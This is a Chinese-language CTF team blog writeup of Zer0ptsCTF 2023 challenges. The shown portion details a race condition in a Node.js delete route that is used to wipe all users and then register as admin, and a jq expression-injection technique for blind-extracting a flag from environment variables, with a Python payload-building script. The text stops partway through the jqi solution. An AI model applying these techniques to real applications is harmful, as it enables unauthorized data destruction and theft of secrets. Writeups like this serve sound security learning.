<!doctype html><html lang=en itemscope itemtype=http://schema.org/WebPage><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1"><title>2023 Zer0ptsCTF SU Writeup -</title><meta name=description content="本次2023 Zer0ptsCTF 是我们SU第一次正式组织参加国际赛，获得全球榜第二十七名，大陆第三名，我们会继续努力，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com或直接联系书鱼(QQ:381382770)
以下是我们 SU 本次 Zer0ptsCTF writeup"><meta name=author content="SUer"><script type=application/ld+json>{"@context":"http://schema.org","@type":"WebSite","name":"su-team","url":"https:\/\/su-team.cn\/"}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"Organization","name":"","url":"https:\/\/su-team.cn\/"}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"https:\/\/su-team.cn\/","name":"home"}},{"@type":"ListItem","position":3,"item":{"@id":"https:\/\/su-team.cn\/post\/zer0ptsctf-2023-su-wu\/","name":"2023 zer0pts ctf su writeup"}}]}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"Article","author":{"name":"SUer"},"headline":"2023 Zer0ptsCTF SU Writeup","description":"本次2023 Zer0ptsCTF 是我们SU第一次正式组织参加国际赛，获得全球榜第二十七名，大陆第三名，我们会继续努力，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com或直接联系书鱼(QQ:381382770) 以下是我们 SU 本次 Zer0ptsCTF writeup\n","inLanguage":"en","wordCount":2393,"datePublished":"2023-07-17T16:36:50\u002b00:00","dateModified":"2023-07-17T16:36:50\u002b00:00","image":"https:\/\/su-team.cn\/img\/SU.jpg","keywords":["OtherCTF"],"mainEntityOfPage":"https:\/\/su-team.cn\/post\/zer0ptsctf-2023-su-wu\/","publisher":{"@type":"Organization","name":"https:\/\/su-team.cn\/","logo":{"@type":"ImageObject","url":"https:\/\/su-team.cn\/img\/SU.jpg","height":60,"width":60}}}</script><meta property="og:title" content="2023 Zer0ptsCTF SU Writeup"><meta property="og:description" content="本次2023 Zer0ptsCTF 是我们SU第一次正式组织参加国际赛，获得全球榜第二十七名，大陆第三名，我们会继续努力，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com或直接联系书鱼(QQ:381382770)
以下是我们 SU 本次 Zer0ptsCTF writeup"><meta property="og:image" content="https://su-team.cn/img/SU.jpg"><meta property="og:url" content="https://su-team.cn/post/zer0ptsctf-2023-su-wu/"><meta property="og:type" content="website"><meta property="og:site_name" content="su-team"><meta name=twitter:title content="2023 Zer0ptsCTF SU Writeup"><meta name=twitter:description content="本次2023 Zer0ptsCTF 是我们SU第一次正式组织参加国际赛，获得全球榜第二十七名，大陆第三名，我们会继续努力，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com或直接联系书鱼(QQ:381382770)
以下是我们 SU 本次 Zer0ptsCTF writeup"><meta name=twitter:image content="https://su-team.cn/img/SU.jpg"><meta name=twitter:card content="summary_large_image"><link href=https://su-team.cn/img/SU.jpg rel=icon type=image/x-icon><meta name=generator content="Hugo 0.148.2"><link rel=alternate href=https://su-team.cn/index.xml type=application/rss+xml title=su-team><link rel=stylesheet href=https://su-team.cn/css/katex.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/brands.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/fontawesome.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/regular.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/solid.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/svg.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/svg-with-js.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/v4-font-face.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/v4-shims.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/v5-font-face.min.css><link rel=stylesheet href=https://su-team.cn/css/bootstrap.min.css><link rel=stylesheet href=https://su-team.cn/css/main.css><link rel=stylesheet href=https://su-team.cn/css/fonts.css><link rel=stylesheet href=https://su-team.cn/css/syntax.css><link rel=stylesheet href=https://su-team.cn/css/codeblock.css><link rel=stylesheet href=https://su-team.cn/css/photoswipe.min.css><link rel=stylesheet href=https://su-team.cn/css/photoswipe.default-skin.min.css><style>.navbar-custom .avatar-container{width:58px;height:58px;margin-top:-29px;left:50%;transform:translateX(-50%);display:flex;align-items:center;justify-content:center;background:#fff;border-radius:50%;box-shadow:0 6px 18px rgba(0,0,0,.12)}.navbar-custom .avatar-container .avatar-img-border{width:100%;height:100%;border-radius:50%;overflow:hidden;margin:0;box-shadow:none}.navbar-custom .avatar-container .avatar-img{width:100%;height:100%;object-fit:cover;border-radius:50%}@media only screen and (min-width:768px){.navbar-custom .avatar-container{width:72px;height:72px;margin-top:-36px}}</style></head><body><nav class="navbar navbar-default navbar-fixed-top navbar-custom"><div class=container-fluid><div class=navbar-header><button type=button class=navbar-toggle data-toggle=collapse data-target=#main-navbar>
<span class=sr-only>Toggle navigation</span>
<span class=icon-bar></span>
<span class=icon-bar></span>
<span class=icon-bar></span>
</button>
<a class="theme-toggle mobile-theme-toggle" href=javascript:void(0) onclick=toggleTheme() title="Toggle Theme"><span class=sr-only>Toggle Theme</span>
<svg class="theme-icon-moon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg class="theme-icon-sun" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
</a><a class=navbar-brand href=https://su-team.cn/>su-team</a></div><div class="collapse navbar-collapse" id=main-navbar><ul class="nav navbar-nav navbar-right"><li><a title=Archives href=/>Archives</a></li><li class=navlinks-container><a class=navlinks-parent role=button tabindex=0>Members</a><div class=navlinks-children><a href=/active-members>Members</a>
<a href=/pioneers>Pioneers</a></div></li><li><a title=About href=/page/about/>About</a></li><li><a title=Tags href=/tags>Tags</a></li><li class=hidden-xs><a href=javascript:void(0) class=theme-toggle onclick=toggleTheme() title="Toggle Theme"><span class=sr-only>Toggle Theme</span>
<svg class="theme-icon-moon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg class="theme-icon-sun" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></a></li></ul></div></div></nav><script>(function(){const e=localStorage.getItem("theme"),t=window.matchMedia("(prefers-color-scheme: dark)").matches;e==="dark"||!e&&t?document.body.classList.add("dark-mode"):document.body.classList.remove("dark-mode")})();function toggleTheme(){const e=document.body;e.classList.toggle("dark-mode"),e.classList.contains("dark-mode")?localStorage.setItem("theme","dark"):localStorage.setItem("theme","light")}</script><style>.theme-toggle{cursor:pointer;padding:15px;display:flex;align-items:center}.mobile-theme-toggle{float:right;padding:15px 10px;margin-top:2px}@media(min-width:768px){.mobile-theme-toggle{display:none !important}}.theme-icon-moon,.theme-icon-sun{color:#777;transition:color .3s,transform .3s}.theme-toggle:hover .theme-icon-moon,.theme-toggle:hover .theme-icon-sun{color:#333}.theme-icon-sun{display:none}.theme-icon-moon{display:block}body.dark-mode .theme-icon-sun{display:block;color:#000}body.dark-mode .theme-icon-moon{display:none}body.dark-mode{filter:none !important;background-color:#1a1a1a !important}body.dark-mode header,body.dark-mode .container,body.dark-mode footer{filter:invert(1)hue-rotate(180deg)}body.dark-mode .navbar-custom{background-color:#1a1a1a !important;border-bottom:1px solid #333}body.dark-mode .navbar-custom .container-fluid{filter:invert(1)hue-rotate(180deg)}body.dark-mode img,body.dark-mode video,body.dark-mode iframe,body.dark-mode .avatar-img,body.dark-mode .navbar-custom .avatar-container{filter:invert(1)hue-rotate(180deg)}</style><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
</button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><header class=header-section><div class="intro-header no-img"><div class=container><div class=row><div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1"><div class=post-heading><h1>2023 Zer0ptsCTF SU Writeup</h1><span class=post-meta><i class="fas fa-calendar"></i>&nbsp;Posted on July 17, 170750
&nbsp;|&nbsp;<i class="fas fa-clock"></i>&nbsp;12&nbsp;min
&nbsp;|&nbsp;<i class="fas fa-book"></i>&nbsp;2393&nbsp;words
&nbsp;|&nbsp;<i class="fas fa-user"></i>&nbsp;SUer</span></div></div></div></div></div></header><div class=container role=main><div class="row flex-row"><div class="col-lg-3 col-lg-offset-0 col-md-3 col-md-offset-0 hidden-sm hidden-xs"><div class=toc-sidebar><h4 class=toc-title>#<br>TABLE OF CONTENTS</h4><div class=toc-card><nav id=TableOfContents><ul><li><ul><li><a href=#web>web</a><ul><li><a href=#warmuprofile>Warmuprofile</a></li><li><a href=#jqi>jqi</a></li></ul></li><li><a href=#pwn>Pwn</a><ul><li><a href=#qjail>qjail</a></li><li><a href=#brainjit>Brainjit</a></li></ul></li><li><a href=#re>Re</a><ul><li><a href=#decompile-me>decompile me</a></li><li><a href=#mimikyu>mimikyu</a></li></ul></li><li><a href=#cry>Cry</a><ul><li><a href=#easy_factoring>easy_factoring</a></li></ul></li><li><a href=#misc>Misc</a><ul><li><a href=#netfs-1>NetFS 1</a></li><li><a href=#netfs2>NetFS2</a></li></ul></li></ul></li></ul></nav></div></div></div><div class="col-lg-9 col-md-9"><article role=main class=blog-post><p>本次2023 Zer0ptsCTF 是我们SU第一次正式组织参加国际赛，获得全球榜第二十七名，大陆第三名，我们会继续努力，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：<a href=mailto:suers_xctf@126.com>suers_xctf@126.com</a>或直接联系书鱼(QQ:381382770)
以下是我们 SU 本次 Zer0ptsCTF writeup</p><h2 id=web>web</h2><h3 id=warmuprofile>Warmuprofile</h3><p>POST /user/:username/delete 路由存在条件竞争</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=nx>app</span><span class=p>.</span><span class=nx>post</span><span class=p>(</span><span class=s1>&#39;/user/:username/delete&#39;</span><span class=p>,</span> <span class=nx>needAuth</span><span class=p>,</span> <span class=kr>async</span> <span class=p>(</span><span class=nx>req</span><span class=p>,</span> <span class=nx>res</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=p>{</span> <span class=nx>username</span> <span class=p>}</span> <span class=o>=</span> <span class=nx>req</span><span class=p>.</span><span class=nx>params</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=p>{</span> <span class=nx>username</span><span class=o>:</span> <span class=nx>loggedInUsername</span> <span class=p>}</span> <span class=o>=</span> <span class=nx>req</span><span class=p>.</span><span class=nx>session</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>loggedInUsername</span> <span class=o>!==</span> <span class=s1>&#39;admin&#39;</span> <span class=o>&amp;&amp;</span> <span class=nx>loggedInUsername</span> <span class=o>!==</span> <span class=nx>username</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>flash</span><span class=p>(</span><span class=nx>req</span><span class=p>,</span> <span class=s1>&#39;general user can only delete itself&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nx>res</span><span class=p>.</span><span class=nx>redirect</span><span class=p>(</span><span class=s1>&#39;/&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// find user to be deleted
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=kr>const</span> <span class=nx>user</span> <span class=o>=</span> <span class=kr>await</span> <span class=nx>User</span><span class=p>.</span><span class=nx>findOne</span><span class=p>({</span>
</span></span><span class=line><span class=cl>        <span class=nx>where</span><span class=o>:</span> <span class=p>{</span> <span class=nx>username</span> <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>});</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kr>await</span> <span class=nx>User</span><span class=p>.</span><span class=nx>destroy</span><span class=p>({</span>
</span></span><span class=line><span class=cl>        <span class=nx>where</span><span class=o>:</span> <span class=p>{</span> <span class=p>...</span><span class=nx>user</span><span class=o>?</span><span class=p>.</span><span class=nx>dataValues</span> <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>});</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// user is deleted, so session should be logged out
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nx>req</span><span class=p>.</span><span class=nx>session</span><span class=p>.</span><span class=nx>destroy</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>res</span><span class=p>.</span><span class=nx>redirect</span><span class=p>(</span><span class=s1>&#39;/&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>});</span>
</span></span></code></pre></td></tr></table></div></div><p>假设有两个请求，第一个请求正常执行，但其中await User.findOne会有一定的操作延迟
在这个时间内，第二个请求跟进来，sesssion.username 跟 req.param.username 还是一样的，执行到await User.findOne的时候，用户已经被删除了，User.findOne 会返回为 null ，然后 执行 await User.destroy 操作会把所有用户都删了
知晓原理后用BurpSuite扩展 Turbo Intruder 进行条件竞争，删除所有用户
再利用 POST /register 路由创建admin用户，就可以获得flag</p><p>参考链接：
<a href=https://www.nodejsdesignpatterns.com/blog/node-js-race-conditions/>https://www.nodejsdesignpatterns.com/blog/node-js-race-conditions/</a>
<a href=https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html>https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html</a></p><h3 id=jqi>jqi</h3><p>jq_wiki: <a href=https://github.com/jqlang/jq/wiki>https://github.com/jqlang/jq/wiki</a>
nodejs调用jq二进制文件解析json，命令注入或者jq的表达式可以利用？
jq官方手册: <a href=https://jqlang.github.io/jq/manual/#Formatstringsandescaping>https://jqlang.github.io/jq/manual/#Formatstringsandescaping</a>
<code>$ENV可以表示环境变量，有字符串插值\(exp)但是\(被过滤了</code></p><p>官方文档还提供base64之类的东西，也许有用吧【 不用管了
利用 \ 逃逸，然后通过data.json中各个字段凑齐base64的标准码表，利用if来盲注环境变量里面的flag即可。
由于双引号被过滤了，单引号又不能表示字符，因此在data.json中把base64中包含的字符串集齐</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>getstr1</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>s</span> <span class=o>=</span> <span class=s2>&#34;zer0pts{me$s4g3_p4$$1ng_thru|p1pez_4r3_gr347!83157e16e25aa73f8a1fa1af06ac897a0f47d5be53ebb601953a43b6b3b4ca49}&#34;</span>
</span></span><span class=line><span class=cl>    <span class=c1># 找不到: i</span>
</span></span><span class=line><span class=cl>    <span class=c1># 找不到: j</span>
</span></span><span class=line><span class=cl>    <span class=c1># 找不到: k</span>
</span></span><span class=line><span class=cl>    <span class=c1># 找不到: l</span>
</span></span><span class=line><span class=cl>    <span class=c1># 找不到: o</span>
</span></span><span class=line><span class=cl>    <span class=c1># 找不到: q</span>
</span></span><span class=line><span class=cl>    <span class=c1># 找不到: v</span>
</span></span><span class=line><span class=cl>    <span class=c1># 找不到: w</span>
</span></span><span class=line><span class=cl>    <span class=c1># 找不到: x</span>
</span></span><span class=line><span class=cl>    <span class=c1># 找不到: y</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>string</span><span class=o>.</span><span class=n>ascii_lowercase</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>index</span> <span class=o>=</span> <span class=n>s</span><span class=o>.</span><span class=n>index</span><span class=p>(</span><span class=n>i</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>s</span><span class=p>[</span><span class=n>index</span><span class=p>]</span><span class=o>.</span><span class=n>isupper</span><span class=p>():</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;&#34;</span><span class=si>{</span><span class=n>i</span><span class=o>.</span><span class=n>upper</span><span class=p>()</span><span class=si>}</span><span class=s1>&#34;: &#34;(.[3].flag[</span><span class=si>{</span><span class=n>index</span><span class=si>}</span><span class=s1>:</span><span class=si>{</span><span class=n>index</span><span class=o>+</span><span class=mi>1</span><span class=si>}</span><span class=s1>])&#34;,&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;&#34;</span><span class=si>{</span><span class=n>i</span><span class=si>}</span><span class=s1>&#34;: &#34;(.[3].flag[</span><span class=si>{</span><span class=n>index</span><span class=si>}</span><span class=s1>:</span><span class=si>{</span><span class=n>index</span><span class=o>+</span><span class=mi>1</span><span class=si>}</span><span class=s1>]|ascii_downcase)&#34;,&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;&#34;</span><span class=si>{</span><span class=n>i</span><span class=si>}</span><span class=s1>&#34;: &#34;(.[3].flag[</span><span class=si>{</span><span class=n>index</span><span class=si>}</span><span class=s1>:</span><span class=si>{</span><span class=n>index</span><span class=o>+</span><span class=mi>1</span><span class=si>}</span><span class=s1>])&#34;,&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;&#34;</span><span class=si>{</span><span class=n>i</span><span class=o>.</span><span class=n>upper</span><span class=p>()</span><span class=si>}</span><span class=s1>&#34;: &#34;(.[3].flag[</span><span class=si>{</span><span class=n>index</span><span class=si>}</span><span class=s1>:</span><span class=si>{</span><span class=n>index</span><span class=o>+</span><span class=mi>1</span><span class=si>}</span><span class=s1>]|ascii_upcase)&#34;,&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>except</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>pass</span>
</span></span><span class=line><span class=cl>            <span class=c1># print(&#34;找不到: &#34; + i)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>getstr2</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>s</span> <span class=o>=</span> <span class=s2>&#34;zer0pts{1.Use_@trusted_escapes/2.Use_boundscheck=safeonly/3.Trust_GC}&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=s2>&#34;ijkloqvwxy/=&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>index</span> <span class=o>=</span> <span class=n>s</span><span class=o>.</span><span class=n>index</span><span class=p>(</span><span class=n>i</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>s</span><span class=p>[</span><span class=n>index</span><span class=p>]</span><span class=o>.</span><span class=n>isupper</span><span class=p>():</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;&#34;</span><span class=si>{</span><span class=n>i</span><span class=o>.</span><span class=n>upper</span><span class=p>()</span><span class=si>}</span><span class=s1>&#34;: &#34;(.[4].flag[</span><span class=si>{</span><span class=n>index</span><span class=si>}</span><span class=s1>:</span><span class=si>{</span><span class=n>index</span><span class=o>+</span><span class=mi>1</span><span class=si>}</span><span class=s1>])&#34;,&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;&#34;</span><span class=si>{</span><span class=n>i</span><span class=si>}</span><span class=s1>&#34;: &#34;(.[4].flag[</span><span class=si>{</span><span class=n>index</span><span class=si>}</span><span class=s1>:</span><span class=si>{</span><span class=n>index</span><span class=o>+</span><span class=mi>1</span><span class=si>}</span><span class=s1>]|ascii_downcase)&#34;,&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;&#34;</span><span class=si>{</span><span class=n>i</span><span class=si>}</span><span class=s1>&#34;: &#34;(.[4].flag[</span><span class=si>{</span><span class=n>index</span><span class=si>}</span><span class=s1>:</span><span class=si>{</span><span class=n>index</span><span class=o>+</span><span class=mi>1</span><span class=si>}</span><span class=s1>])&#34;,&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;&#34;</span><span class=si>{</span><span class=n>i</span><span class=o>.</span><span class=n>upper</span><span class=p>()</span><span class=si>}</span><span class=s1>&#34;: &#34;(.[4].flag[</span><span class=si>{</span><span class=n>index</span><span class=si>}</span><span class=s1>:</span><span class=si>{</span><span class=n>index</span><span class=o>+</span><span class=mi>1</span><span class=si>}</span><span class=s1>]|ascii_upcase)&#34;,&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>except</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>pass</span>
</span></span><span class=line><span class=cl>            <span class=c1># print(&#34;找不到: &#34; + i)</span>
</span></span><span class=line><span class=cl>            <span class=c1># 找不到: q</span>
</span></span><span class=line><span class=cl>            <span class=c1># 找不到: v</span>
</span></span><span class=line><span class=cl>            <span class=c1># 找不到: w</span>
</span></span><span class=line><span class=cl>            <span class=c1># 找不到: x</span>
</span></span><span class=line><span class=cl>            <span class=c1># 找不到: i</span>
</span></span><span class=line><span class=cl>            <span class=c1># 找不到: j</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>getstr3</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>s</span> <span class=o>=</span> <span class=s2>&#34;zer0pts{foo/bar/../../../../../directory/traversal}&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=s2>&#34;qvwxij&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>index</span> <span class=o>=</span> <span class=n>s</span><span class=o>.</span><span class=n>index</span><span class=p>(</span><span class=n>i</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>s</span><span class=p>[</span><span class=n>index</span><span class=p>]</span><span class=o>.</span><span class=n>isupper</span><span class=p>():</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;&#34;</span><span class=si>{</span><span class=n>i</span><span class=o>.</span><span class=n>upper</span><span class=p>()</span><span class=si>}</span><span class=s1>&#34;: &#34;(.[0].flag[</span><span class=si>{</span><span class=n>index</span><span class=si>}</span><span class=s1>:</span><span class=si>{</span><span class=n>index</span><span class=o>+</span><span class=mi>1</span><span class=si>}</span><span class=s1>])&#34;,&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;&#34;</span><span class=si>{</span><span class=n>i</span><span class=si>}</span><span class=s1>&#34;: &#34;(.[0].flag[</span><span class=si>{</span><span class=n>index</span><span class=si>}</span><span class=s1>:</span><span class=si>{</span><span class=n>index</span><span class=o>+</span><span class=mi>1</span><span class=si>}</span><span class=s1>]|ascii_downcase)&#34;,&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;&#34;</span><span class=si>{</span><span class=n>i</span><span class=si>}</span><span class=s1>&#34;: &#34;(.[0].flag[</span><span class=si>{</span><span class=n>index</span><span class=si>}</span><span class=s1>:</span><span class=si>{</span><span class=n>index</span><span class=o>+</span><span class=mi>1</span><span class=si>}</span><span class=s1>])&#34;,&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;&#34;</span><span class=si>{</span><span class=n>i</span><span class=o>.</span><span class=n>upper</span><span class=p>()</span><span class=si>}</span><span class=s1>&#34;: &#34;(.[0].flag[</span><span class=si>{</span><span class=n>index</span><span class=si>}</span><span class=s1>:</span><span class=si>{</span><span class=n>index</span><span class=o>+</span><span class=mi>1</span><span class=si>}</span><span class=s1>]|ascii_upcase)&#34;,&#39;</span><span class=p>)</span>
